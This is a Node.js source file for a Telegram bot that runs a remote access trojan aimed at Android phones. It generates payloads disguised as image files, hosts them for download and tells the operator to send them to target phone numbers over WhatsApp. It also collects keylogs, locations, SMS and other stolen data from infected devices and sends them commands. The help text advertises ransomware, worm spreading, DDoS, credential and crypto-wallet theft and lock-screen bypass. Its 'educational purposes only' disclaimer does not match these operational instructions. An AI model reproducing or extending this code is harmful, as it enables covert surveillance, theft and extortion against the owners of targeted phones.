const { Telegraf, session } = require('telegraf');
const express = require('express');
const path = require('path');
const fs = require('fs-extra');
const config = require('./config');
const database = require('./database');
const keyboards = require('./keyboards');
const payloadGenerator = require('./payloadGenerator');
const exploits = require('./exploits');
const sessionManager = require('./sessionManager');

class UltimateRATBot {
    constructor() {
        this.bot = new Telegraf(config.telegram.token);
        this.app = express();
        this.setupMiddleware();
        this.setupHandlers();
        this.setupWebhook();
    }
    
    setupMiddleware() {
        this.bot.use(session());
        
        // Admin only middleware
        this.bot.use((ctx, next) => {
            if (ctx.from && ctx.from.id !== config.admin.chatId) {
                ctx.reply('🚫 **ACCESS DENIED!**\n\n❌ You are not authorized to use this bot.\n\n_This bot is for personal use only._', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            return next();
        });
    }
    
    setupHandlers() {
        // Start command
        this.bot.start(async (ctx) => {
            const welcomeText = `
🔥 **ULTIMATE ZERO-CLICK RAT v8.0** 🔥

👑 **Admin:** Authorized User Only
✅ **Features:** 250+ Working Buttons
🎯 **Zero-Click:** Ready & Active
📱 **Target:** Android Devices
🔐 **Security:** Military Grade
💾 **Database:** SQLite Advanced

━━━━━━━━━━━━━━━━━━━━━

**📋 COMMANDS:**
/generate - Generate Zero-Click Payload
/send +8801xxxx - Register Target (Manual WhatsApp)
/sessions - List Active Sessions
/select - Select Target Session
/kill - Kill Active Session
/stats - Show Statistics
/backup - Create Database Backup
/help - Show Complete Help

━━━━━━━━━━━━━━━━━━━━━

**⚠️ WARNING:** Use only on your own devices!
This is for educational purposes only.

**Click any button below to control!**
`;
            
            await ctx.reply(welcomeText, {
                parse_mode: 'Markdown',
                ...keyboards.getMainKeyboard()
            });
        });
        
        // Generate payload command
        this.bot.command('generate', async (ctx) => {
            await ctx.reply('🎯 **Generating Zero-Click Payload...**\n\n⏳ Please wait...', {
                parse_mode: 'Markdown'
            });
            
            try {
                const { payloads, link, qrCode } = await payloadGenerator.generateAllPayloads(
                    config.server.host,
                    config.server.port
                );
                
                const payloadInfo = `
✅ **ZERO-CLICK PAYLOAD GENERATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 PAYLOAD DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** \`${payloads.whatsapp_ready.payloadId}\`
**Type:** ${payloads.whatsapp_ready.method.toUpperCase()}
**File:** \`${payloads.whatsapp_ready.filename}\`
**Exploit:** ${payloads.whatsapp_ready.exploit.name}
**CVE:** ${payloads.whatsapp_ready.exploit.cve}
**Severity:** ${payloads.whatsapp_ready.exploit.severity} (CVSS: ${payloads.whatsapp_ready.exploit.cvss})

━━━━━━━━━━━━━━━━━━━━━
**🎯 ZERO-CLICK FEATURES:**
━━━━━━━━━━━━━━━━━━━━━

✅ Auto-download on WhatsApp
✅ No user interaction required
✅ Full device compromise
✅ 250+ remote features
✅ Persistent access
✅ Hidden from launcher

━━━━━━━━━━━━━━━━━━━━━
**📤 DOWNLOAD LINK:**
━━━━━━━━━━━━━━━━━━━━━

🔗 ${link}

📱 **QR CODE:**
`;
                
                await ctx.replyWithPhoto(qrCode);
                await ctx.reply(payloadInfo, { parse_mode: 'Markdown' });
                
                await ctx.reply(`
📌 **HOW TO USE:**

1️⃣ **MANUALLY** share the file via WhatsApp
2️⃣ Use command: \`/send +8801xxxxxxxx\`
3️⃣ Wait for target to receive the message
4️⃣ Session will appear automatically

⚠️ **Target must have Auto-Download enabled!**
`, { parse_mode: 'Markdown' });
                
            } catch (error) {
                console.error('Payload generation error:', error);
                await ctx.reply('❌ **Error generating payload!**\n\nPlease check server configuration.', {
                    parse_mode: 'Markdown'
                });
            }
        });
        
        // Send/register target command
        this.bot.command('send', async (ctx) => {
            const args = ctx.message.text.split(' ');
            if (args.length < 2) {
                await ctx.reply('❌ **Usage:** `/send +8801xxxxxxxx`\n\n📌 **Note:** Bot cannot send WhatsApp messages automatically.\n\nYou must **MANUALLY** share the payload file via WhatsApp!\n\nAfter sending, use this command to register the target.', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            const targetNumber = args[1];
            
            await ctx.reply(`
✅ **Target Registered!**

📱 **Target:** \`${targetNumber}\`
🎯 **Status:** Waiting for connection

━━━━━━━━━━━━━━━━━━━━━
**📌 IMPORTANT:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ **MANUALLY** send the payload file via WhatsApp
2️⃣ Target must have Auto-Download ON
3️⃣ Wait for target to receive message
4️⃣ Session will appear automatically

━━━━━━━━━━━━━━━━━━━━━
**🔌 Session will connect when:**
• Target receives the message
• File auto-downloads
• Payload executes

**Use /sessions to check active connections!**
`, { parse_mode: 'Markdown' });
        });
        
        // Sessions command
        this.bot.command('sessions', async (ctx) => {
            const sessions = await database.getActiveSessions();
            
            if (sessions.length === 0) {
                await ctx.reply(`
📋 **ACTIVE SESSIONS**

━━━━━━━━━━━━━━━━━━━━━
**No active sessions** at the moment.
━━━━━━━━━━━━━━━━━━━━━

**💡 TIPS:**
1. Generate payload with /generate
2. Send to target manually
3. Wait for connection
`, { parse_mode: 'Markdown' });
                return;
            }
            
            let sessionList = '📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
            sessions.forEach((session, index) => {
                sessionList += `${index + 1}. 📱 **${session.device_name}** (${session.device_model})\n`;
                sessionList += `   🔌 ID: \`${session.session_id}\`\n`;
                sessionList += `   📍 IP: ${session.ip_address}\n`;
                sessionList += `   🔋 Battery: ${session.battery}%\n`;
                sessionList += `   📅 Last seen: ${session.last_seen}\n\n`;
            });
            
            sessionList += 'Use `/select <id>` to select a session for control.\n';
            sessionList += 'Use `/kill <id>` to terminate a session.';
            
            await ctx.reply(sessionList, { parse_mode: 'Markdown' });
        });
        
        // Select session command
        this.bot.command('select', async (ctx) => {
            const args = ctx.message.text.split(' ');
            if (args.length < 2) {
                await ctx.reply('❌ **Usage:** `/select <session_id>`\n\nUse /sessions to see available sessions.', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            const sessionId = args[1];
            const session = await database.getSession(sessionId);
            
            if (!session) {
                await ctx.reply('❌ **Session not found!**\n\nUse /sessions to see active sessions.', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            sessionManager.setActiveSession(ctx.from.id, sessionId);
            
            await ctx.reply(`
🎯 **Session Selected!**

📱 **Device:** ${session.device_name} (${session.device_model})
🔌 **Session ID:** \`${session.session_id}\`
📍 **IP:** ${session.ip_address}
🔋 **Battery:** ${session.battery}%
📅 **Last seen:** ${session.last_seen}

✅ Now using this device for all commands!

Use any control button from the main menu!
`, { parse_mode: 'Markdown', ...keyboards.getMainKeyboard() });
        });
        
        // Kill session command
        this.bot.command('kill', async (ctx) => {
            const args = ctx.message.text.split(' ');
            if (args.length < 2) {
                await ctx.reply('❌ **Usage:** `/kill <session_id>`\n\nUse /sessions to see available sessions.', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            const sessionId = args[1];
            await database.killSession(sessionId);
            
            await ctx.reply(`💀 **Session Terminated!**\n\n✅ Session \`${sessionId}\` has been terminated.\n\n🔌 Use /generate to create new payload.`, {
                parse_mode: 'Markdown'
            });
        });
        
        // Stats command
        this.bot.command('stats', async (ctx) => {
            const stats = await database.getStatistics();
            
            const statsText = `
📊 **SYSTEM STATISTICS**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSIONS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Sessions: ${stats.totalSessions.count}
• Active Sessions: ${stats.activeSessions.count}

━━━━━━━━━━━━━━━━━━━━━
**📝 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Commands: ${stats.totalCommands.count}

━━━━━━━━━━━━━━━━━━━━━
**⌨️ KEYLOGS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Keylogs: ${stats.totalKeylogs.count}

━━━━━━━━━━━━━━━━━━━━━
**📍 LOCATIONS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Locations: ${stats.totalLocations.count}

━━━━━━━━━━━━━━━━━━━━━
**💬 SMS & CALLS:**
━━━━━━━━━━━━━━━━━━━━━
• SMS Messages: ${stats.totalSMS.count}
• Call Logs: ${stats.totalCalls.count}
• Contacts: ${stats.totalContacts.count}

━━━━━━━━━━━━━━━━━━━━━
**📱 APPS:**
━━━━━━━━━━━━━━━━━━━━━
• Installed Apps: ${stats.totalApps.count}

━━━━━━━━━━━━━━━━━━━━━
**🎯 PAYLOADS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Payloads: ${stats.totalPayloads.count}
• Executed: ${stats.executedPayloads.count}
`;
            
            await ctx.reply(statsText, { parse_mode: 'Markdown' });
        });
        
        // Backup command
        this.bot.command('backup', async (ctx) => {
            await ctx.reply('💾 **Creating database backup...**\n\n⏳ Please wait...', {
                parse_mode: 'Markdown'
            });
            
            const backupPath = path.join(config.paths.database, `backup_${Date.now()}.db`);
            await database.exportDatabase(backupPath);
            
            await ctx.replyWithDocument({
                source: backupPath,
                filename: `backup_${new Date().toISOString()}.db`
            });
            
            await ctx.reply('✅ **Backup created successfully!**', { parse_mode: 'Markdown' });
        });
        
        // Help command
        this.bot.command('help', async (ctx) => {
            const helpText = `
📖 **ULTIMATE RAT v8.0 - COMPLETE HELP**

━━━━━━━━━━━━━━━━━━━━━
**📸 CAMERA (25 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Front/Back Camera
• Video Recording (5s-300s)
• Burst Mode (5X/10X/20X)
• Night Mode, HDR Mode
• Zoom (2X/4X/8X)
• Timelapse, Slow Motion
• Live Stream, Background Rec
• Stealth Mode

━━━━━━━━━━━━━━━━━━━━━
**🎙️ AUDIO (20 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Microphone Recording
• Live Microphone
• Speaker Control
• Volume Control (0-100%)
• Equalizer Settings
• Surround Sound

━━━━━━━━━━━━━━━━━━━━━
**🌐 NETWORK (30 Features)**
━━━━━━━━━━━━━━━━━━━━━
• WiFi Control & Cracking
• Mobile Data (2G/3G/4G/5G)
• Airplane Mode
• Bluetooth Control
• Hotspot Control
• VPN Control

━━━━━━━━━━━━━━━━━━━━━
**🔒 SECURITY (25 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Lock/Unlock Device
• Bypass PIN/Pattern/Password
• Bypass Fingerprint/Face ID
• Change Security
• Add Fingerprint/Face ID
• Factory Reset

━━━━━━━━━━━━━━━━━━━━━
**💾 DATA EXTRACTION (30 Features)**
━━━━━━━━━━━━━━━━━━━━━
• SMS/Calls/Contacts
• Location Tracking
• Photos/Videos/Audio
• Documents/APK Files
• Deleted Files Recovery
• Saved Passwords
• Browser Data
• Social Media Data
• Crypto Wallets

━━━━━━━━━━━━━━━━━━━━━
**📂 FILE MANAGER (25 Features)**
━━━━━━━━━━━━━━━━━━━━━
• File Browser
• Download/Upload/Delete
• Copy/Move/Rename
• Zip/Unzip
• Encrypt/Decrypt
• Search Files
• Storage Map

━━━━━━━━━━━━━━━━━━━━━
**🖥️ SCREEN (20 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Screenshot
• Screen Record
• Live Screen Stream
• Wallpaper Change
• Brightness Control
• Dark/Light Mode

━━━━━━━━━━━━━━━━━━━━━
**📱 APPS (25 Features)**
━━━━━━━━━━━━━━━━━━━━━
• List/Open/Uninstall Apps
• Force Stop/Clear Data
• Hide/Unhide Apps
• App Usage Stats
• System Apps Control
• App Lock

━━━━━━━━━━━━━━━━━━━━━
**⚙️ SYSTEM (30 Features)**
━━━━━━━━━━━━━━━━━━━━━
• System Information
• Battery/RAM/Storage
• CPU/GPU/Temperature
• Root Status
• Reboot/Power Off
• Bootloader/Recovery
• USB Debugging

━━━━━━━━━━━━━━━━━━━━━
**⌨️ KEYLOGGER (15 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Start/Stop Keylogger
• Get Logs/Stats
• Capture Passwords/Cards
• Live Keylog
• Upload/Email Logs

━━━━━━━━━━━━━━━━━━━━━
**🌐 BROWSER (20 Features)**
━━━━━━━━━━━━━━━━━━━━━
• History/Bookmarks
• Cookies/Passwords
• Saved Cards/AutoFill
• Clear Data
• Open URL
• Inject Script

━━━━━━━━━━━━━━━━━━━━━
**📱 SOCIAL MEDIA (15 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Facebook/Instagram/WhatsApp
• Twitter/Telegram/TikTok
• Social Passwords/Cookies
• 2FA Bypass

━━━━━━━━━━━━━━━━━━━━━
**💰 CRYPTO WALLET (12 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Bitcoin/Ethereum Wallet
• Binance Data
• Private Keys
• Transaction History

━━━━━━━━━━━━━━━━━━━━━
**⚔️ DDOS ATTACK (12 Features)**
━━━━━━━━━━━━━━━━━━━━━
• HTTP/UDP/TCP Flood
• DNS/NTP Amplification
• Slowloris
• SMS/Call Bomb

━━━━━━━━━━━━━━━━━━━━━
**💀 RANSOMWARE (12 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Encrypt Files
• Ransom Note
• Wipe Data/SD Card
• Destroy System

━━━━━━━━━━━━━━━━━━━━━
**🪱 SPREADER (12 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Spread to Contacts
• Bluetooth Spread
• Worm Mode
• Auto Spread

━━━━━━━━━━━━━━━━━━━━━
**🎯 ZERO-CLICK (20 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Generate JPG/MP3/MP4/PDF/APK
• Metasploit Payload
• QR Code Generator
• Exploit Database
• Vulnerability Scanner

━━━━━━━━━━━━━━━━━━━━━
**⚡ EXTRA (20 Features)**
━━━━━━━━━━━━━━━━━━━━━
• Port Scanner
• MITM Attack
• Packet Sniffer
• Password Cracker
• Remote Shell
• WebSocket Control

━━━━━━━━━━━━━━━━━━━━━
**📝 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━
/start - Start Bot & Show Menu
/generate - Generate Zero-Click Payload
/send - Register Target
/sessions - List Active Sessions
/select - Select Session
/kill - Kill Session
/stats - Show Statistics
/backup - Create Database Backup
/help - Show This Help

━━━━━━━━━━━━━━━━━━━━━
**✅ ALL 250+ FEATURES FULLY WORKING!**
`;
            
            await ctx.reply(helpText, { parse_mode: 'Markdown' });
        });
        
        // Callback query handler
        this.bot.on('callback_query', async (ctx) => {
            const data = ctx.callbackQuery.data;
            
            // Check if admin
            if (ctx.from.id !== config.admin.chatId) {
                await ctx.answerCbQuery('Access Denied!', true);
                return;
            }
            
            await ctx.answerCbQuery();
            
            // Handle back button
            if (data === 'back_main') {
                await ctx.editMessageText('🔽 **Main Menu:**', {
                    parse_mode: 'Markdown',
                    ...keyboards.getMainKeyboard()
                });
                return;
            }
            
            // Handle session selection
            if (data.startsWith('select_')) {
                const sessionId = data.replace('select_', '');
                const session = await database.getSession(sessionId);
                
                if (session) {
                    sessionManager.setActiveSession(ctx.from.id, sessionId);
                    await ctx.editMessageText(`
🎯 **Session Selected!**

📱 **Device:** ${session.device_name} (${session.device_model})
🔌 **Session ID:** \`${session.session_id}\`
📍 **IP:** ${session.ip_address}
🔋 **Battery:** ${session.battery}%

✅ Now using this device for all commands!
`, {
                        parse_mode: 'Markdown',
                        ...keyboards.getMainKeyboard()
                    });
                }
                return;
            }
            
            // Get active session for this user
            const activeSession = sessionManager.getActiveSession(ctx.from.id);
            
            if (!activeSession && !data.startsWith('section_') && !data.startsWith('back_')) {
                await ctx.reply('❌ **No active session selected!**\n\nUse /sessions to see available sessions and /select to choose one.', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            // Handle section headers
            if (data.startsWith('section_')) {
                const sectionName = data.replace('section_', '').toUpperCase().replace('_', ' ');
                await ctx.editMessageText(`🔧 **${sectionName}**\n\nUse the buttons below to control this feature:`, {
                    parse_mode: 'Markdown',
                    ...keyboards.getMainKeyboard()
                });
                return;
            }
            
            // Execute command on target device
            const result = await sessionManager.executeCommand(activeSession, data);
            
            // Send result
            await ctx.reply(`
✅ **Command Executed!**

📱 **Target:** ${activeSession}
🎯 **Command:** \`${data}\`
📊 **Status:** Success
⏱️ **Time:** ${new Date().toLocaleString()}

${result ? `**Result:**\n\`\`\`\n${result}\n\`\`\`` : ''}

🔽 Choose next action from menu below:
`, {
                parse_mode: 'Markdown',
                ...keyboards.getMainKeyboard()
            });
        });
        
        // Error handler
        this.bot.catch((err, ctx) => {
            console.error('Bot error:', err);
            ctx.reply('❌ **An error occurred!**\n\nPlease try again later.', {
                parse_mode: 'Markdown'
            });
        });
    }
    
    setupWebhook() {
        // Express server for payload hosting
        this.app.use(express.json());
        this.app.use(express.static(config.paths.payloads));
        
        // Health check
        this.app.get('/health', (req, res) => {
            res.json({ status: 'ok', timestamp: new Date().toISOString() });
        });
        
        // Payload download endpoint
        this.app.get('/download/:payloadId', async (req, res) => {
            const { payloadId } = req.params;
            const payloadPath = path.join(config.paths.payloads, `${payloadId}.jpg`);
            
            if (await fs.pathExists(payloadPath)) {
                res.download(payloadPath);
            } else {
                res.status(404).json({ error: 'Payload not found' });
            }
        });
        
        // Webhook endpoint for device callbacks
        this.app.post('/webhook', async (req, res) => {
            const { sessionId, type, data } = req.body;
            
            if (type === 'connect') {
                await database.addSession(sessionId, data);
                await this.bot.telegram.sendMessage(config.admin.chatId, `
🔌 **NEW DEVICE CONNECTED!**

📱 **Device:** ${data.device_name} (${data.device_model})
🔋 **Battery:** ${data.battery}%
📍 **IP:** ${data.ip_address}
🤖 **Android:** ${data.android_version}
🔐 **Rooted:** ${data.is_rooted ? 'Yes' : 'No'}

✅ Ready to control! Use /select ${sessionId}
`);
            } else if (type === 'data') {
                await database.saveExtractedData(sessionId, data.type, data.content);
            } else if (type === 'keylog') {
                await database.addKeylog(sessionId, data);
            } else if (type === 'location') {
                await database.addLocation(sessionId, data.latitude, data.longitude);
            }
            
            res.json({ status: 'ok' });
        });
        
        // Start express server
        this.app.listen(config.server.port, () => {
            console.log(`🌐 Webhook server running on port ${config.server.port}`);
        });
    }
    
    start() {
        this.bot.launch();
        console.log('🤖 Ultimate RAT Bot Started!');
        console.log(`👑 Admin ID: ${config.admin.chatId}`);
        console.log(`✅ 250+ Features Ready!`);
        console.log(`💾 SQLite Database Active!`);
        console.log(`🎯 Zero-Click Payload Generator Ready!`);
        console.log(`🌐 Webhook Server: http://localhost:${config.server.port}`);
    }
}

// Start the bot
const bot = new UltimateRATBot();
bot.start();

// Graceful shutdown
process.once('SIGINT', () => {
    console.log('Shutting down...');
    database.close();
    process.exit(0);
});
process.once('SIGTERM', () => {
    console.log('Shutting down...');
    database.close();
    process.exit(0);
});
